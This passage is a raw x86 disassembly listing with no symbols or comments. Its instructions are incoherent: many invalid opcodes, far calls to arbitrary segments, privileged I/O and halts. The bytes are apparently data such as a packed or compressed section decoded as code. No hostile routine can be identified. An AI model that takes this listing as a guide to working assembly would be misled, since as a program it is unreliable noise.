  425bd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425bd3:	add    BYTE PTR [ebp+0x34],bl
  425bd6:	lahf   
  425bd7:	daa    
  425bd8:	or     esi,DWORD PTR [esi+0x66]
  425bdb:	mov    edi,0xa02f4834
  425be0:	and    BYTE PTR [ebx-0x57],bh
  425be3:	fstp   QWORD PTR [ebx+edi*4-0x676d424f]
  425bea:	popf   
  425beb:	xor    BYTE PTR [esi+0x320d6dd5],bl
  425bf1:	inc    ebx
  425bf2:	scas   eax,DWORD PTR es:[edi]
  425bf3:	cmp    al,0x82
  425bf5:	bswap  eax
  425bf7:	outs   dx,DWORD PTR ds:[esi]
  425bf8:	or     al,0xdc
  425bfa:	add    eax,0x3c7f4c27
  425bff:	inc    esp
  425c00:	mov    dl,0x3
  425c02:	or     eax,0x4acc6de3
  425c07:	pop    ecx
  425c08:	ins    BYTE PTR es:[edi],dx
  425c09:	or     ecx,eax
  425c0b:	xchg   BYTE PTR ss:[esi-0x6efcbcd6],cl
  425c12:	call   0xe6d3:0x389cef6c
  425c19:	mov    ds:0x62e3a70a,eax
  425c1e:	pop    eax
  425c1f:	jo     0x425bba
  425c21:	mov    ecx,0x4bb24b64
  425c26:	or     DWORD PTR [ebx+0xf5943c],ebp
  425c2c:	inc    ebp
  425c2d:	or     al,0xe6
  425c2f:	inc    ebx
  425c30:	xor    edx,DWORD PTR [esi-0x2]
  425c33:	push   edi
  425c34:	push   ds
  425c35:	aam    0xd4
  425c37:	fwait
  425c38:	mov    dl,0x8e
  425c3a:	lock (bad) 
  425c3c:	mov    edx,0xa6e22984
  425c41:	or     edi,DWORD PTR [ebp+0xc3014fc]
  425c47:	xchg   BYTE PTR [ebp+0x494da485],bl
  425c4d:	mov    WORD PTR [edx-0x2569450f],es
  425c53:	or     al,0x74
  425c55:	adc    eax,0x2e21a2d4
  425c5a:	xchg   esi,eax
  425c5b:	jbe    0x425cb7
  425c5d:	mov    WORD PTR [ebx+0x34431db7],gs
  425c63:	jno    0x425c17
  425c65:	mov    ch,0xe9
  425c67:	call   0x5b6e4e1f
  425c6c:	jae    0x425ca1
  425c6e:	or     al,0xe1
  425c70:	xor    ch,BYTE PTR [ebp+ecx*1+0x40f80572]
  425c77:	test   eax,0xab1b3ab2
  425c7c:	(bad)  
  425c7e:	add    eax,0x8b168008
  425c83:	repnz (bad) 
  425c85:	retf   
  425c86:	(bad)  
  425c87:	sbb    bl,BYTE PTR [edx-0x5346ad62]
  425c8d:	add    edx,0x26b3b2b7
  425c93:	ret    0x842f
  425c96:	and    DWORD PTR [edi+0x55dee70b],0x951bc78d
  425ca0:	dec    edx
  425ca1:	out    dx,eax
  425ca2:	jbe    0x425c68
  425ca4:	mov    dl,0xb0
  425ca6:	(bad)  
  425ca7:	push   0x60
  425ca9:	mov    esi,0xba0b872
  425cae:	mov    eax,ds:0x6c1b2584
  425cb3:	iret   
  425cb4:	push   eax
  425cb5:	mov    cs:0x680b54a3,al
  425cbb:	es adc al,0x9b
  425cbe:	test   eax,0x850be681
  425cc3:	push   es
  425cc4:	or     bh,BYTE PTR [esi]
  425cc6:	add    al,0xd9
  425cc8:	sbb    al,0x78
  425cca:	call   0x340b:0x5ec96250
  425cd1:	jecxz  0x425ca1
  425cd3:	(bad)  
  425cd4:	int3   
  425cd5:	sub    al,0x64
  425cd7:	cmp    DWORD PTR [bp+0x43],eax
  425cdb:	popf   
  425cdc:	dec    esi
  425cdd:	push   0xffffff90
  425cdf:	xlat   BYTE PTR ds:[ebx]
  425ce0:	xor    bl,BYTE PTR [esi-0x10]
  425ce3:	imul   esi,DWORD PTR [ebp-0x7389614d],0xdef4984b
  425ced:	ins    BYTE PTR es:[edi],dx
  425cee:	outs   dx,BYTE PTR ds:[esi]
  425cef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425cf0:	idiv   BYTE PTR ds:0xd26918e2
  425cf6:	mov    ds:0x6be2aa1a,eax
  425cfb:	fisubr WORD PTR [edx-0x80]
  425cfe:	sub    edi,DWORD PTR [eax+0x67f9c06f]
  425d04:	xor    DWORD PTR [ebx+edx*4],edx
  425d07:	popa   
  425d08:	imul   bh
  425d0a:	call   0x55f2:0x544252c5
  425d11:	popa   
  425d12:	mov    eax,ds:0x110492a7
  425d17:	clc    
  425d18:	jno    0x425cf9
  425d1a:	dec    edi
  425d1b:	xor    BYTE PTR [edx+0x4b863541],0x1b
  425d22:	xchg   edi,eax
  425d23:	dec    ecx
  425d24:	or     ebp,DWORD PTR es:[ecx]
  425d27:	cwde   
  425d28:	sar    dl,cl
  425d2a:	pop    esp
  425d2b:	sbb    esp,eax
  425d2d:	leave  
  425d2e:	outs   dx,BYTE PTR ds:[esi]
  425d2f:	inc    ebx
  425d30:	mov    dl,0x25
  425d32:	div    DWORD PTR [ecx-0x41f3c88f]
  425d38:	jp     0x425d1d
  425d3a:	adc    eax,0xe08b6fa7
  425d3f:	adc    dl,cl
  425d41:	sbb    DWORD PTR [edi+0x3b2bb25a],0x58f99ce2
  425d4b:	mov    DWORD PTR ds:0xd956e10b,0x1b5ca410
  425d55:	les    ebx,FWORD PTR [edx+0x65f3a375]
  425d5b:	cmp    BYTE PTR [ebx-0x7d],dl
  425d5e:	inc    ecx
  425d5f:	aas    
  425d60:	lock push cs
  425d62:	xchg   ebp,eax
  425d63:	(bad)  
  425d65:	shl    DWORD PTR [ecx],cl
  425d67:	dec    eax
  425d68:	xor    al,BYTE PTR [ecx]
  425d6a:	inc    edi
  425d6b:	fsub   DWORD PTR [ebx+0xb]
  425d6e:	loop   0x425d8e
  425d70:	ins    DWORD PTR es:[edi],dx
  425d71:	push   esp
  425d72:	int3   
  425d73:	jb     0x425dd9
  425d75:	stos   BYTE PTR es:[edi],al
  425d76:	test   DWORD PTR [ecx+0x55],ecx
  425d79:	imul   ebx,DWORD PTR [edx],0xffffffe3
  425d7c:	jns    0x425df5
  425d7e:	or     eax,0xdc0b69ba
  425d83:	aam    0xf7
  425d85:	push   DWORD PTR [ebx-0x650d8f55]
  425d8b:	(bad)  
  425d8c:	mov    ebx,0x261cfe04
  425d91:	xor    BYTE PTR [ebx],0xa9
  425d94:	sbb    al,ah
  425d96:	jmp    DWORD PTR [esi-0x6e]
  425d99:	mov    ecx,0xc2959258
  425d9e:	cdq    
  425d9f:	pop    ss
  425da0:	sub    eax,0x15bd46f3
  425da5:	ret    
  425da6:	clc    
  425da7:	icebp  
  425da8:	pop    esp
  425da9:	or     ebp,ecx
  425dab:	mov    ecx,0x77825e79
  425db0:	sahf   
  425db1:	cld    
  425db2:	xchg   BYTE PTR [esi+0x59],bl
  425db5:	(bad)  
  425db7:	jae    0x425d3d
  425db9:	jle    0x425d47
  425dbb:	js     0x425e0f
  425dbd:	popa   
  425dbe:	js     0x425deb
  425dc0:	loop   0x425dbc
  425dc2:	adc    eax,0x8647a5e9
  425dc7:	sbb    eax,0x25ca45bb
  425dcc:	fild   WORD PTR [edx+0x73]
  425dcf:	addr16 sahf 
  425dd1:	out    0x70,al
  425dd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425dd4:	daa    
  425dd5:	push   esp
  425dd6:	fsincos 
  425dd8:	loope  0x425e36
  425dda:	das    
  425ddb:	fs mov ebp,0xcf53555e
  425de1:	popf   
  425de2:	lahf   
  425de3:	sub    bl,bl
  425de5:	add    DWORD PTR [edx+0x72],ebx
  425de8:	mov    dh,dh
  425dea:	jecxz  0x425d8c
  425dec:	jmp    0x425e31
  425dee:	sub    edx,DWORD PTR [edi+0x540a5bb3]
  425df4:	sub    eax,0xd4d69ad8
  425df9:	repz dec eax
  425dfb:	test   DWORD PTR [edi+0xba77fa0],ecx
  425e01:	inc    ebx
  425e02:	inc    ecx
  425e03:	aad    0x18
  425e05:	ja     0x425dc2
  425e07:	jmp    0x70b2:0x996affae
  425e0e:	lock pop ss
  425e10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e11:	leave  
  425e12:	(bad)  
  425e13:	fisubr DWORD PTR [ebp-0x4d3b58cc]
  425e19:	aam    0xad
  425e1b:	xchg   esi,eax
  425e1c:	xchg   ecx,eax
  425e1d:	test   al,0xf3
  425e1f:	mov    ds:0xf3d8a7b2,al
  425e24:	mul    BYTE PTR [edx+0x178c06dd]
  425e2a:	mov    bh,0xd9
  425e2c:	jle    0x425e70
  425e2e:	dec    esp
  425e2f:	fidiv  DWORD PTR [edx]
  425e31:	int3   
  425e32:	lahf   
  425e33:	or     eax,0x35c27c61
  425e38:	loope  0x425eb6
  425e3a:	out    dx,eax
  425e3b:	shl    BYTE PTR [edx-0x607d5918],cl
  425e41:	jae    0x425eb5
  425e43:	or     esp,ebx
  425e45:	cli    
  425e46:	cli    
  425e47:	push   ds
  425e48:	js     0x425e5d
  425e4a:	mov    BYTE PTR [edi+0x6b],bh
  425e4d:	jne    0x425e3b
  425e4f:	shl    DWORD PTR [ebp+0x97c4086],cl
  425e55:	jns    0x425e91
  425e57:	scas   eax,DWORD PTR es:[edi]
  425e58:	fnstsw WORD PTR [ebx]
  425e5a:	push   edx
  425e5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425e5c:	repz add al,0x6e
  425e60:	pop    ds
  425e61:	jmp    0x425e55
  425e63:	fnstenv [edx-0x195fab74]
  425e69:	(bad)  
  425e6a:	mov    esp,0x630b9f71
  425e6f:	stos   BYTE PTR es:[edi],al
  425e70:	fucomp st(2)
  425e72:	sub    esp,DWORD PTR [ebp-0x1265da3d]
  425e78:	push   esp
  425e79:	out    dx,eax
  425e7a:	jbe    0x425e42
  425e7c:	mov    ecx,0x66d420e0
  425e81:	or     ebx,DWORD PTR [ebx-0x4373829e]
  425e87:	arpl   bp,di
  425e89:	mov    DWORD PTR [edx-0x380908f],ebx
  425e8f:	ror    BYTE PTR [eax],cl
  425e91:	shl    DWORD PTR [eax-0x22],1
  425e94:	dec    DWORD PTR [esi]
  425e96:	dec    edx
  425e97:	imul   esi,DWORD PTR [ecx+0x7c],0x7b5a2791
  425e9e:	das    
  425e9f:	das    
  425ea0:	mov    dl,0x3f
  425ea2:	mov    ds:0x32c73b99,al
  425ea7:	sub    al,0x82
  425ea9:	or     bl,BYTE PTR ds:0xe2ebdd2
  425eaf:	ja     0x425e46
  425eb1:	jnp    0x425eae
  425eb3:	je     0x425e3e
  425eb5:	int    0xd2
  425eb7:	daa    
  425eb8:	sub    eax,0xbae4178a
  425ebd:	sub    eax,0x5baaae28
  425ec2:	jecxz  0x425e70
  425ec4:	xor    ch,BYTE PTR ds:0x94a4a359
  425eca:	xchg   DWORD PTR [eax+0x6d],eax
  425ecd:	scas   al,BYTE PTR es:[edi]
  425ece:	call   0x7b7c:0x7e5a4d6c
  425ed5:	or     ebx,ebx
  425ed7:	push   esp
  425ed8:	lods   al,BYTE PTR ds:[esi]
  425ed9:	lds    edi,FWORD PTR gs:[ebx+0x1b]
  425edd:	setp   dl
  425ee0:	hlt    
  425ee1:	mov    eax,0x5714604e
  425ee6:	fnstsw WORD PTR [edx+0x285fc240]
  425eec:	test   al,0x51
  425eee:	call   0xae80:0x579f8fa9
  425ef5:	ror    BYTE PTR [ecx-0x4d2b0d46],cl
  425efb:	hlt    
  425efc:	pushf  
  425efd:	fcom   DWORD PTR [edi+eiz*4-0x6a]
  425f01:	lods   eax,DWORD PTR ds:[esi]
  425f02:	repnz outs dx,BYTE PTR ds:[esi]
  425f04:	outs   dx,BYTE PTR ds:[esi]
  425f05:	lahf   
  425f06:	xor    edi,DWORD PTR [edx-0x4e]
  425f09:	add    BYTE PTR [edx],ch
  425f0b:	repz pop esp
  425f0d:	nop
  425f0e:	pop    ss
  425f0f:	icebp  
  425f10:	mov    cl,BYTE PTR [ebx+esi*4]
  425f13:	cmp    eax,0x71abc12
  425f18:	imul   esi,DWORD PTR [eax-0x524d331c],0xffffff92
  425f1f:	imul   esi,DWORD PTR [eax-0x16b21204],0xb
  425f26:	das    
  425f27:	xchg   edx,eax
  425f28:	mov    dh,0x57
  425f2a:	js     0x425f37
  425f2c:	stos   DWORD PTR es:[edi],eax
  425f2d:	pusha  
  425f2e:	call   0xcd44:0x3dc02f62
  425f35:	stc    
  425f36:	shl    DWORD PTR [edi+0x46028955],0x82
  425f3d:	sub    al,0x3c
  425f3f:	aam    0x6c
  425f41:	loope  0x425f9d
  425f43:	jecxz  0x425ed5
  425f45:	(bad)  
  425f46:	mov    eax,DWORD PTR [edi+0x6e4d003d]
  425f4c:	add    eax,0xbe149a02
  425f51:	rcl    al,1
  425f53:	jne    0x425f12
  425f55:	ins    DWORD PTR es:[edi],dx
  425f56:	sub    ah,al
  425f58:	ds stos DWORD PTR es:[edi],eax
  425f5a:	or     edi,DWORD PTR [ecx+ecx*8]
  425f5d:	xor    esi,DWORD PTR [ecx]
  425f5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425f60:	mov    eax,0x244bfd52
  425f65:	cmc    
  425f66:	pop    ecx
  425f67:	mov    cs,WORD PTR [edx+0x2ab81316]
  425f6d:	push   cs
  425f6e:	(bad)  
  425f70:	test   BYTE PTR [eax+0xbc272b7],ch
  425f76:	imul   ebx,DWORD PTR [edi+eax*4+0x2083a971],0xdfac9ae5
  425f81:	sbb    ch,dh
  425f83:	push   es
  425f84:	cmc    
  425f85:	or     BYTE PTR [esi+ebp*4-0x44],ah
  425f89:	ret    0x5ea1
  425f8c:	mov    dl,0x4f
  425f8e:	fxch   st(0)
  425f90:	leave  
  425f91:	ins    DWORD PTR es:[edi],dx
  425f92:	cwde   
  425f93:	ss inc ebp
  425f95:	mov    WORD PTR [ebp-0x5d],cs
  425f98:	dec    DWORD PTR [ebx-0x53]
  425f9b:	pop    ss
  425f9c:	popa   
  425f9d:	or     eax,DWORD PTR [ebp+eax*2-0x124fab9d]
  425fa4:	int3   
  425fa5:	cli    
  425fa6:	lea    ebx,[esi-0x61650f17]
  425fac:	pop    ds
  425fad:	int    0xf5
  425faf:	mov    dl,0x4b
  425fb1:	or     ecx,DWORD PTR [esi+0x7a08522]
  425fb7:	scas   al,BYTE PTR es:[edi]
  425fb8:	sbb    al,0x8
  425fba:	call   0x1f9c:0x18287d12
  425fc1:	mov    eax,0x509fa768
  425fc6:	xor    edi,0xa92ddf83
  425fcc:	mov    dl,0x9
  425fce:	stc    
  425fcf:	cdq    
  425fd0:	in     al,dx
  425fd1:	fwait
  425fd2:	xor    eax,0x2c0b32b1
  425fd7:	into   
  425fd8:	adc    ch,ch
  425fda:	ins    BYTE PTR es:[edi],dx
  425fdb:	mov    ah,0xb1
  425fdd:	mov    ebx,0x88afbc9a
  425fe2:	inc    ebp
  425fe3:	data16 hlt 
  425fe5:	xchg   edi,eax
  425fe6:	mov    cl,0x8f
  425fe8:	xchg   esp,eax
  425fe9:	add    ah,BYTE PTR [edx]
  425feb:	mov    edx,0xa46fef04
  425ff0:	mov    ebp,0x42444e4e
  425ff5:	call   0x459a:0x6bc32867
  425ffc:	pop    edx
  425ffd:	sti    
  425ffe:	push   ds
  425fff:	pop    esi
  426000:	xor    ch,dl
  426002:	pop    esp
  426003:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426004:	enterw 0x89aa,0x4e
  426009:	lock out dx,eax
  42600b:	hlt    
  42600c:	scas   eax,DWORD PTR es:[edi]
  42600d:	pop    ebp
  42600e:	jl     0x425f97
  426010:	jae    0x426086
  426012:	jne    0x426059
  426014:	cs push ebp
  426016:	mov    edx,0x110b66dc
  42601b:	sbb    cl,BYTE PTR [edx-0x54]
  42601e:	cmp    DWORD PTR [eax+0x63],esi
  426021:	out    0x9a,al
  426023:	or     esi,DWORD PTR [esi+0x25]
  426026:	mov    ds:0xe8c57f2d,al
  42602b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42602c:	shr    DWORD PTR [ecx],cl
  42602e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42602f:	inc    esi
  426030:	sbb    DWORD PTR [ecx],0xffffffc7
  426033:	mov    ah,0xbd
  426035:	jno    0x42607c
  426037:	add    eax,0x9f8eeaf6
  42603c:	or     bh,dh
  42603e:	jp     0x4260b4
  426040:	outs   dx,DWORD PTR ds:[esi]
  426041:	add    al,0xff
  426043:	in     eax,dx
  426044:	dec    edi
  426045:	add    dl,bl
  426047:	inc    edi
  426048:	leave  
  426049:	sub    BYTE PTR [eax+eiz*2],0xb2
  42604d:	push   ss
  42604e:	dec    ebp
  42604f:	dec    edi
  426050:	adc    eax,edi
  426052:	lods   eax,DWORD PTR ds:[esi]
  426053:	jp     0x426051
  426055:	or     ecx,DWORD PTR [ebx]
  426057:	dec    esp
  426058:	add    esi,DWORD PTR [ebx]
  42605a:	std    
  42605b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42605c:	xchg   ecx,eax
  42605d:	push   esp
  42605e:	call   0x7bf3:0x9289fec7
  426065:	inc    edx
  426066:	push   0xbdf7dba7
  42606b:	lods   al,BYTE PTR ds:[esi]
  42606c:	cmp    DWORD PTR [esi-0x80],0xb937b2a1
  426073:	(bad)  
  426074:	mov    edi,0xd148a33b
  426079:	add    eax,0xa04d6e69
  42607e:	pop    ecx
  42607f:	add    eax,esp
  426081:	sbb    cl,BYTE PTR [edx]
  426083:	stos   DWORD PTR es:[edi],eax
  426084:	scas   eax,DWORD PTR es:[edi]
  426085:	xor    esp,esp
  426087:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426088:	inc    esp
  426089:	outs   dx,BYTE PTR ds:[esi]
  42608a:	xchg   ecx,eax
  42608b:	shl    DWORD PTR [eax+0x49],0x40
  42608f:	daa    
  426090:	adc    DWORD PTR [edi],ecx
  426092:	fbstp  TBYTE PTR [esi+0x75]
  426095:	fwait
  426096:	push   edi
  426097:	fisttp DWORD PTR [ebx+0x5c26180b]
  42609d:	mov    esi,cs
  42609f:	mov    ds:0xce9dfcef,al
  4260a4:	or     eax,ebx
  4260a6:	daa    
  4260a7:	jno    0x426035
  4260a9:	or     esp,esp
  4260ab:	push   ecx
  4260ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4260ad:	dec    esp
  4260ae:	jmp    0x402cf85a
  4260b3:	in     al,0x2f
  4260b5:	inc    eax
  4260b6:	test   eax,0x1bcbb2b4
  4260bb:	or     DWORD PTR [eax],eax
  4260bd:	iret   
  4260be:	pushf  
  4260bf:	or     edi,DWORD PTR [ebx+0x3c238d36]
  4260c5:	lock sub dl,ah
  4260c8:	adc    dl,BYTE PTR [eax+0xa]
  4260cb:	ds mov esp,fs
  4260ce:	pusha  
  4260cf:	and    BYTE PTR [edx+0x7f7ddc4e],dh
  4260d5:	jmp    0x426140
  4260d7:	add    esp,DWORD PTR [ecx+0xb]
  4260da:	iret   
  4260db:	mov    gs,WORD PTR [edx+0x64]
  4260de:	cmp    DWORD PTR [ecx],edx
  4260e0:	aam    0x2
  4260e2:	in     al,dx
  4260e3:	daa    
  4260e4:	mov    dl,0xff
  4260e6:	lods   al,BYTE PTR ds:[esi]
  4260e7:	dec    ecx
  4260e8:	mov    ebp,0x23a0926c
  4260ed:	in     eax,0x28
  4260ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260f0:	imul   ebx,DWORD PTR [eax-0x1],0x16
  4260f4:	or     ebx,0xffffffda
  4260f7:	mov    dh,0x21
  4260f9:	and    ebx,DWORD PTR [edx-0x20710df8]
  4260ff:	push   0xffffffc5
  426101:	cli    
  426102:	dec    ecx
  426103:	test   al,0xfe
  426105:	dec    ecx
  426106:	shl    BYTE PTR [ebx+0xb551c12],0xe3
  42610d:	sbb    BYTE PTR [edx+0x50f0aa38],0x7
  426114:	and    ch,dh
  426116:	add    DWORD PTR [eax+0x4b37f2bc],esp
  42611c:	mov    ebx,ecx
  42611e:	adc    al,0x8a
  426120:	inc    esp
  426121:	dec    esp
  426122:	fwait
  426123:	leave  
  426124:	(bad)  
  426126:	jnp    0x426136
  426128:	sub    DWORD PTR [ecx+0x66],eax
  42612b:	jecxz  0x426114
  42612d:	jno    0x426148
  42612f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426130:	jbe    0x426196
  426132:	or     eax,0x29f473d6
  426137:	leave  
  426138:	mov    dl,0x84
  42613a:	fld    DWORD PTR [ebp+0x4b70adac]
  426140:	fisttp DWORD PTR [ebx]
  426142:	push   0x6e
  426144:	adc    esp,DWORD PTR [ecx-0x287cbe82]
  42614a:	fwait
  42614b:	cmp    edi,edi
  42614d:	aam    0x8a
  42614f:	sahf   
  426150:	cld    
  426151:	out    dx,al
  426152:	jg     0x4260e6
  426154:	jbe    0x42614c
  426156:	jmp    0xf7b1:0x87200da7
  42615d:	(bad)  
  42615e:	gs data16 mov dl,0x2a
  426162:	cmc    
  426163:	or     edi,ecx
  426165:	fadd   st(5),st
  426167:	dec    esi
  426168:	icebp  
  426169:	or     esi,DWORD PTR [edi-0x7c]
  42616c:	imul   esi,DWORD PTR [esi+edx*2-0x6527c125],0xa
  426174:	sbb    DWORD PTR [ebx+0x5180ce14],0x9088a90b
  42617e:	in     al,0xbf
  426180:	in     eax,dx
  426181:	dec    ebx
  426182:	loopne 0x426129
  426184:	sbb    DWORD PTR [esi],edx
  426186:	or     edi,0x452f73b6
  42618c:	inc    ebp
  42618d:	xor    BYTE PTR [edx-0x13],bl
  426190:	pop    ecx
  426191:	out    dx,al
  426192:	lods   al,BYTE PTR ds:[esi]
  426193:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426194:	dec    ecx
  426195:	add    al,0xb4
  426197:	fisub  DWORD PTR [esi]
  426199:	iret   
  42619a:	sub    DWORD PTR [edi],0x11bdc1bc
  4261a0:	cld    
  4261a1:	dec    ebx
  4261a2:	adc    ebx,eax
  4261a4:	cmc    
  4261a5:	fistp  QWORD PTR [edx]
  4261a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4261a8:	mov    bl,BYTE PTR [edx+0x4c]
  4261ab:	pop    ecx
  4261ac:	adc    al,0xf6
  4261ae:	sub    ecx,edx
  4261b0:	mov    ?,ebp
  4261b2:	and    ah,BYTE PTR [esi-0x7ad62544]
  4261b8:	bound  ecx,QWORD PTR [edi]
  4261ba:	inc    edx
  4261bb:	and    eax,0x39cc0b23
  4261c0:	or     BYTE PTR [esi-0x79],ah
  4261c3:	call   0xecdd6081
  4261c8:	icebp  
  4261c9:	test   BYTE PTR [edi],dl
  4261cb:	sub    ebx,DWORD PTR [edi]
  4261cd:	fist   DWORD PTR [edi+0x29e4a8a7]
  4261d3:	neg    DWORD PTR [edx-0x60]
  4261d6:	lds    edi,FWORD PTR [ebx-0x1f41a64e]
  4261dc:	out    dx,eax
  4261dd:	fwait
  4261de:	rcr    BYTE PTR [ecx],1
  4261e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261e1:	or     ecx,ecx
  4261e3:	push   ebp
  4261e4:	lock inc esi
  4261e6:	loopne 0x426199
  4261e8:	(bad)  
  4261e9:	pop    edi
  4261ea:	call   0xdecf:0x4ce58169
  4261f1:	mov    ah,0x94
  4261f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4261f4:	jecxz  0x426264
  4261f6:	cwde   
  4261f7:	adc    bh,ch
  4261f9:	lock pusha 
  4261fb:	sub    esi,DWORD PTR [edx-0x6bc1122c]
  426201:	loopne 0x4261c8
  426203:	add    eax,0xc8800b0c
  426208:	push   esi
  426209:	jge    0x42623d
  42620b:	(bad)  
  42620c:	lock adc ebx,DWORD PTR [eax-0x869b158]
  426213:	xor    dh,dl
  426215:	mov    BYTE PTR [esi],ah
  426217:	cli    
  426218:	lea    ecx,[ebx+0xb3b07d1]
  42621e:	dec    ebx
  42621f:	pushf  
  426220:	fcom   st(0)
  426222:	fistp  DWORD PTR [edx]
  426224:	mov    edi,0x600b9ab5
  426229:	mov    ecx,0xfa9844e
  42622e:	xchg   ecx,eax
  42622f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426230:	stc    
  426231:	or     ch,BYTE PTR [edx]
  426233:	neg    DWORD PTR [ebp+edx*8-0x44]
  426237:	loope  0x4261ec
  426239:	rol    DWORD PTR [edi+0x3db181b0],0x7e
  426240:	jb     0x426263
  426242:	sbb    BYTE PTR [eax-0xfe5fdb7],0x8f
  426249:	pop    ss
  42624a:	daa    
  42624b:	adc    esi,edi
  42624d:	daa    
  42624e:	call   0x508d:0x1815e368
  426255:	aaa    
  426256:	xchg   esi,eax
  426257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426258:	cmp    BYTE PTR ds:0x20720921,0x64
  42625f:	enter  0x41b5,0xbc
  426263:	or     eax,0x221a6a88
  426268:	xchg   ecx,eax
  426269:	push   esi
  42626a:	jo     0x42620c
  42626c:	push   ss
  42626d:	imul   esi,DWORD PTR [esi+0x150c4aa3],0x14
  426274:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426275:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426276:	cmp    bl,BYTE PTR [ebx+edi*2-0x7ea76570]
  42627d:	xchg   ebp,eax
  42627e:	sub    al,0x2
  426280:	fld    QWORD PTR [esi+0x4d]
  426283:	aaa    
  426284:	or     eax,0x6ffb800b
  426289:	push   edx
  42628a:	xor    BYTE PTR [eax],al
  42628c:	add    ch,BYTE PTR [ebx+0x6db274e8]
  426292:	aaa    
  426293:	jge    0x42624a
  426295:	int    0x44
  426297:	push   es
  426298:	jno    0x4262f5
  42629a:	mov    WORD PTR [ebx+0x3c],ds
  42629d:	sbb    al,0x1c
  42629f:	shl    BYTE PTR [ebx+ecx*1],1
  4262a2:	mov    ds:0x76424896,al
  4262a7:	mov    edx,0x8d9fc2b2
  4262ac:	cmp    ecx,DWORD PTR [ebp-0x4a]
  4262af:	push   0x1f
  4262b1:	xor    al,0x8b
  4262b3:	or     eax,0xfec28132
  4262b8:	je     0x42627e
  4262ba:	xor    DWORD PTR [ecx-0x4e],ebx
  4262bd:	mov    ch,0xc1
  4262bf:	retf   
  4262c0:	lea    ebp,[esi-0xdca14a1]
  4262c6:	outs   dx,BYTE PTR ds:[esi]
  4262c7:	inc    ebp
  4262c8:	outs   dx,DWORD PTR ds:[esi]
  4262c9:	adc    eax,0x8b839f3c
  4262ce:	mov    edx,0xf2f6a6ba
  4262d3:	cmp    DWORD PTR [ecx-0xbc7e0eb],edi
  4262d9:	or     ebx,DWORD PTR [eax]
  4262db:	lds    esp,FWORD PTR [ebx+0xa]
  4262de:	into   
  4262df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4262e0:	or     esp,DWORD PTR [esi+0x4aee80ff]
  4262e6:	call   0x9ad31c56
  4262eb:	dec    edi
  4262ec:	mov    ebp,0x38afa405
  4262f1:	outs   dx,DWORD PTR ds:[esi]
  4262f2:	nop
  4262f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4262f4:	stos   BYTE PTR es:[edi],al
  4262f5:	push   ebx
  4262f6:	neg    DWORD PTR [eax-0x22667b14]
  4262fc:	mov    dl,0x9b
  4262fe:	mov    ebx,0xb03f6b55
  426303:	outs   dx,DWORD PTR ds:[esi]
  426304:	js     0x426311
  426306:	and    DWORD PTR [esi+0x75],eax
  426309:	mov    BYTE PTR [esi+0x3],ah
  42630c:	fisttp WORD PTR [ebp+0x65fd8b9a]
  426312:	pop    ds
  426313:	mov    bl,dl
  426315:	xlat   BYTE PTR ds:[ebx]
  426316:	std    
  426317:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426318:	mov    bh,0x9f
  42631a:	pop    edi
  42631b:	jb     0x426308
  42631d:	jnp    0x426343
  42631f:	and    DWORD PTR [ecx-0x2800a33a],esi
  426325:	imul   eax,DWORD PTR [edx],0x31a3bc27
  42632b:	pop    ss
  42632c:	dec    ebx
  42632d:	or     BYTE PTR [edx-0x4b],ah
  426330:	pop    esp
  426331:	dec    eax
  426332:	jb     0x426389
  426334:	(bad)  
  426335:	fidivr WORD PTR [ebp-0x1494d72]
  42633b:	and    edx,DWORD PTR [ebp-0x7a]
  42633e:	dec    ebx
  42633f:	push   cs
  426340:	jmp    0x39df3e0
  426345:	or     al,0xf0
  426347:	add    eax,edx
  426349:	sbb    eax,0x8bf2b326
  42634e:	shr    BYTE PTR [ecx+esi*1+0x40],1
  426352:	mov    ds:0x618b5eb9,al
  426357:	mov    edx,edi
  426359:	mov    ds,WORD PTR [ecx-0x7f46761]
  42635f:	mov    edi,0x41e6ba1e
  426364:	xchg   ecx,eax
  426365:	xchg   BYTE PTR [ebp+edi*8+0x3e9ae74b],dh
  42636c:	mov    esi,0xcbfaeda1
  426371:	or     eax,DWORD PTR [ebx+0x26e507]
  426377:	sahf   
  426378:	add    bl,dl
  42637a:	call   0x647a:0xf75ebbc5
  426381:	inc    DWORD PTR [esi]
  426383:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426384:	xchg   ebp,eax
  426385:	aaa    
  426386:	inc    ebp
  426387:	mov    al,0xb1
  426389:	or     al,0x79
  42638b:	imul   esi,DWORD PTR [ebx+0x49cc8c7f],0x765932ca
  426395:	xchg   ecx,eax
  426396:	mov    ecx,DWORD PTR [ebx-0x58f23851]
  42639c:	sbb    DWORD PTR [ecx-0x52],ecx
  42639f:	das    
  4263a0:	pop    ebp
  4263a1:	jne    0x42633d
  4263a3:	(bad)  [ebx+0x6d3f90b1]
  4263a9:	sbb    esi,ecx
  4263ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4263ac:	inc    ebp
  4263ad:	mov    eax,0x51149fde
  4263b2:	icebp  
